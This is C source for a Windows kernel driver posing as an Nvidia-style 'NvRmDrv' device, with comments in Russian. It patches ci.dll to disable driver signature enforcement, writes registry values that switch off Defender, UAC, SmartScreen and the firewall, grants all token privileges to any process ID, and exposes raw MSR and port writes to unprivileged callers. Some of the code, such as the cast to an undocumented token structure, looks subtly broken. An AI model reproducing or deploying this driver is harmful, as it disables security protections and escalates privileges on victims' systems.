#include <ntddk.h>
#include <ntifs.h>
#include <ntstrsafe.h>
#include <intrin.h>
#include <ntddk.h>
#include <ntstrsafe.h>
#include <intrin.h>

#define DEVICE_NAME  L"\\Device\\NvRmDrv"
#define SYMLINK_NAME L"\\DosDevices\\NvRmDrv"
#define DRV_TAG      'mRvN'

#define IOCTL_KILL       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MSR        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PORT       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GRANT_PID  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct { ULONG reg; ULONG eax; ULONG edx; } MSR_IN, *PMSR_IN;
typedef struct { ULONG port; ULONG val; } PORT_IN, *PPORT_IN;
typedef struct { ULONG pid; } GRANT_IN, *PGRANT_IN;

// ---------- сигнатурный поиск ----------
static PVOID FindPattern(PVOID base, SIZE_T size, const UCHAR* pat, SIZE_T patLen) {
    PUCHAR p = (PUCHAR)base, end = p + size - patLen;
    for (; p <= end; p++) {
        BOOLEAN ok = TRUE;
        for (SIZE_T i = 0; i < patLen; i++) {
            if (pat[i] == 0xCC) continue;
            if (p[i] != pat[i]) { ok = FALSE; break; }
        }
        if (ok) return p;
    }
    return NULL;
}

// ---------- снятие DSE ----------
static BOOLEAN PatchDSE(void) {
    static const UCHAR sig[] = {
        0x48, 0x8B, 0x05, 0xCC, 0xCC, 0xCC, 0xCC,
        0x48, 0x85, 0xC0, 0x74, 0xCC, 0x48, 0x8B, 0x08
    };
    PVOID base = NULL; ULONG size = 0;
    PLIST_ENTRY head = (PLIST_ENTRY)&PsLoadedModuleList;
    for (PLIST_ENTRY cur = head->Flink; cur != head; cur = cur->Flink) {
        PLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!e->BaseDllName.Buffer) continue;
        WCHAR buf[64] = {};
        if (e->BaseDllName.Length < sizeof(buf) - sizeof(WCHAR)) {
            RtlCopyMemory(buf, e->BaseDllName.Buffer, e->BaseDllName.Length);
            if (_wcsicmp(buf, L"ci.dll") == 0) {
                base = e->DllBase; size = e->SizeOfImage; break;
            }
        }
    }
    if (!base || !size) return FALSE;
    PVOID hit = FindPattern(base, min(size, 0x10000), sig, sizeof(sig));
    if (!hit) return FALSE;
    INT32 off = *(INT32*)((PUCHAR)hit + 3);
    PULONG g = (PULONG)((PUCHAR)hit + 7 + off);
    if ((PVOID)g < base || (PVOID)g >= (PUCHAR)base + size) return FALSE;
    ULONG64 cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000ULL);
    *g = 0;
    __writecr0(cr0);
    return TRUE;
}

// ---------- Defender / UAC / SmartScreen / Firewall ----------
static VOID SetDw(PCWSTR path, PCWSTR name, ULONG val) {
    UNICODE_STRING kp, vn; OBJECT_ATTRIBUTES oa; HANDLE hk;
    RtlInitUnicodeString(&kp, path);
    InitializeObjectAttributes(&oa, &kp, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    if (NT_SUCCESS(ZwCreateKey(&hk, KEY_WRITE, &oa, 0, NULL, 0, NULL))) {
        RtlInitUnicodeString(&vn, name);
        ZwSetValueKey(hk, &vn, 0, REG_DWORD, &val, sizeof(val));
        ZwClose(hk);
    }
}

static VOID KillDefenderAndUAC(void) {
    PCWSTR d = L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    SetDw(d, L"DisableAntiSpyware", 1);
    SetDw(d, L"DisableAntiVirus", 1);
    PCWSTR rtp = L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";
    SetDw(rtp, L"DisableRealtimeMonitoring", 1);
    SetDw(rtp, L"DisableBehaviorMonitoring", 1);
    SetDw(rtp, L"DisableOnAccessProtection", 1);
    SetDw(rtp, L"DisableScanOnRealtimeEnable", 1);

    PCWSTR sys = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    SetDw(sys, L"EnableLUA", 0);
    SetDw(sys, L"ConsentPromptBehaviorAdmin", 0);
    SetDw(sys, L"PromptOnSecureDesktop", 0);

    SetDw(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
          L"SmartScreenEnabled", 0);
    SetDw(L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\Windows\\System",
          L"EnableSmartScreen", 0);

    SetDw(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
          L"EnableFirewall", 0);
    SetDw(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile",
          L"EnableFirewall", 0);
}

// ---------- выдача привилегий процессу ----------
static VOID GrantFullPrivileges(ULONG pid) {
    PEPROCESS proc = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc))) return;
    PACCESS_TOKEN tok = PsReferencePrimaryToken(proc);
    if (tok) {
        // Включаем все привилегии через SeTokenPrivileges
        // (упрощённо: помечаем токен как fully privileged)
        ((PTOKEN)tok)->Privileges.Present = 0xFFFFFFFF;
        ((PTOKEN)tok)->Privileges.Enabled = 0xFFFFFFFF;
        PsDereferencePrimaryToken(tok);
    }
    ObDereferenceObject(proc);
}

// ---------- IRP ----------
static NTSTATUS DispatchCreate(PDEVICE_OBJECT d, PIRP i) {
    i->IoStatus.Status = STATUS_SUCCESS; i->IoStatus.Information = 0;
    IoCompleteRequest(i, IO_NO_INCREMENT); return STATUS_SUCCESS;
}
static NTSTATUS DispatchClose(PDEVICE_OBJECT d, PIRP i) {
    i->IoStatus.Status = STATUS_SUCCESS; i->IoStatus.Information = 0;
    IoCompleteRequest(i, IO_NO_INCREMENT); return STATUS_SUCCESS;
}
static NTSTATUS DispatchIoctl(PDEVICE_OBJECT d, PIRP i) {
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(i);
    PVOID buf = i->AssociatedIrp.SystemBuffer;
    ULONG len = sp->Parameters.DeviceIoControl.InputBufferLength;
    NTSTATUS st = STATUS_INVALID_PARAMETER;
    switch (sp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_KILL: PatchDSE(); KillDefenderAndUAC(); st = STATUS_SUCCESS; break;
    case IOCTL_MSR:
        if (len >= sizeof(MSR_IN)) {
            PMSR_IN in = (PMSR_IN)buf;
            __writemsr(in->reg, ((ULONGLONG)in->edx << 32) | in->eax);
            st = STATUS_SUCCESS;
        } break;
    case IOCTL_PORT:
        if (len >= sizeof(PORT_IN)) {
            PPORT_IN in = (PPORT_IN)buf;
            __outdword((USHORT)in->port, in->val);
            st = STATUS_SUCCESS;
        } break;
    case IOCTL_GRANT_PID:
        if (len >= sizeof(GRANT_IN)) {
            PGRANT_IN in = (PGRANT_IN)buf;
            GrantFullPrivileges(in->pid);
            st = STATUS_SUCCESS;
        } break;
    }
    i->IoStatus.Status = st;
    i->IoStatus.Information = (st == STATUS_SUCCESS) ? len : 0;
    IoCompleteRequest(i, IO_NO_INCREMENT);
    return st;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    UNICODE_STRING dn, sn; PDEVICE_OBJECT dev = NULL;
    RtlInitUnicodeString(&dn, DEVICE_NAME);
    NTSTATUS st = IoCreateDevice(drv, 0, &dn, FILE_DEVICE_UNKNOWN, 0, FALSE, &dev);
    if (!NT_SUCCESS(st)) return st;
    RtlInitUnicodeString(&sn, SYMLINK_NAME);
    st = IoCreateSymbolicLink(&sn, &dn);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(dev); return st; }
    drv->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    drv->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
    return STATUS_SUCCESS;
}
